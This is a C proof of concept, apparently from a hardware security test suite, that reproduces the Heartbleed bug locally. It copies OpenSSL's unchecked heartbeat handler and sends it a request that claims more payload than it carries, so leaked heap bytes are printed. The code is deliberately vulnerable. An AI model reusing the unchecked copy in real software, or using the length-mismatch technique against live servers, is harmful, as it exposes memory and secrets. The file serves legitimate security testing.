#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#if defined(BESSPIN_FREERTOS) && defined(BESSPIN_FPGA)
  #include "FreeRTOS.h"
  #define MALLOC pvPortMalloc
  #define FREE   vPortFree
#else
  #define MALLOC malloc
  #define FREE   free
#endif

// Macros defined in OpenSSL library file 'ssl/ssl_locl.h'.
#define n2s(c,s) ((s=(((unsigned int)(c[0]))<< 8)| \
                     (((unsigned int)(c[1]))    )),c+=2)
#define s2n(s,c) ((c[0]=(unsigned char)(((s)>> 8)&0xff), \
                   c[1]=(unsigned char)(((s)    )&0xff)),c+=2)

// Macros defined in OpenSSL library file 'ssl/ssl3.h'.
#define TLS1_HB_REQUEST  1
#define TLS1_HB_RESPONSE 2

#define POC_HEARTBLEED_REAL_PAYLOAD_LEN 2
#define POC_HEARTBLEED_NOMINAL_PAYLOAD_LEN 20

// Fill in the 'buf' array with 'num' random numbers.
void RAND_pseudo_bytes(unsigned char *buf, size_t num) {
  for (size_t i = 0; i < num; ++i) {
    buf[i] = rand();
  }
}


// Original function implemented in OpenSSL library file 'ssl/t1_lib.c'.
int tls1_process_heartbeat(unsigned char *message) {
  unsigned char *p = &message[0], *pl;
  unsigned short hbtype;
  unsigned int payload;
  unsigned int padding = 16; /* Use minimum padding */

  /* Read type and payload length first */
  hbtype = *p++;
  n2s(p, payload);
  pl = p;

  if (hbtype == TLS1_HB_REQUEST) {
    unsigned char *buffer, *bp;

    /* Allocate memory for the response, size is 1 bytes
     * message type, plus 2 bytes payload length, plus
     * payload, plus padding
     */
    buffer = (unsigned char *) MALLOC (1 + 2 + payload + padding);
    if (buffer == NULL) {
      printf("Failed to allocate space for the response buffer\n");
      return -1;
    }
    bp = buffer;

    /* Enter response type, length and copy payload */
    *bp++ = TLS1_HB_RESPONSE;
    s2n(payload, bp);
    memcpy(bp, pl, payload);
    bp += payload;
    /* Random padding */
    RAND_pseudo_bytes(bp, padding);

    // Instead of returning the heartbeat response, we'll just print the exposed buffer to stdout.
    for (size_t i = 0; i < payload; ++i) {
      unsigned char byte = *(buffer + 1 + 2 + i);
      printf("response payload [%zu]: %03d (0x%02x)\n", i, byte, byte);
    }

    FREE(buffer);
  } else {
    return -1;
  }

  return 0;
}


int main() {
  // Initialize pseudo-random generator.
  srand(0);

  // NOTE TO USER: Change these variables as you see fit to customize the amount of memory spilled.
  //  real_hb_payload_len: The number of bytes that will be in the heartbeat payload we "send" to the server.
  //  nominal_hb_payload_len: The number of bytes that we'll tell the server are in our payload.
  //
  // You can set real_hb_payload_len to as low as 0, and nominal_hb_payload_len to as high as 65535 (2^16 - 1). Just
  // make sure real_hb_payload_len < nominal_hb_payload_len.
  unsigned short real_hb_payload_len    = POC_HEARTBLEED_REAL_PAYLOAD_LEN;
  unsigned short nominal_hb_payload_len = POC_HEARTBLEED_NOMINAL_PAYLOAD_LEN;

  printf("\n>>>>>Starting <heartbleed>: a poc-exploit for <bufferErrors>:\n");
  printf ("Chosen configuration options are <real_payload_len=%d> and <nominal_payload_len=%d>\n",real_hb_payload_len, nominal_hb_payload_len);

  if (real_hb_payload_len >= nominal_hb_payload_len) {
    printf(
      "Warning: To demonstrate Heartbleed vulnerability, ensure (real_payload_len (%d) < nominal_payload_len (%d))\n",
      real_hb_payload_len, nominal_hb_payload_len
    );
  }

  // Use minimum padding.
  size_t padding = 16;

  // Construct heartbeat message.
  unsigned char *hb_message_buffer, *hb_message_p;
  size_t hb_message_len = 1 + 2 + real_hb_payload_len + padding;

  hb_message_buffer = (unsigned char *) MALLOC (hb_message_len);
  if (hb_message_buffer == NULL) {
    printf("Failed to allocate space for heartbeat message\n");
    return -1;
  }
  hb_message_p = hb_message_buffer;

  // Fill in contents of heartbeat message.
  *hb_message_p++ = TLS1_HB_REQUEST;
  s2n(nominal_hb_payload_len, hb_message_p);
  RAND_pseudo_bytes(hb_message_p, real_hb_payload_len + padding);

  // Print out the heartbeat request payload.
  for (size_t i = 0; i < real_hb_payload_len; ++i) {
    unsigned char byte = *(hb_message_buffer + 1 + 2 + i);
    printf("request payload [%zu]: %03d (0x%02x)\n", i, byte, byte);
  }


  // Send heartbeat request to server.
  tls1_process_heartbeat(hb_message_buffer);

  FREE(hb_message_buffer);
  
  printf(">>>>>End of <heartbleed>: a poc-exploit for <bufferErrors>.\n");

  return 0;
}
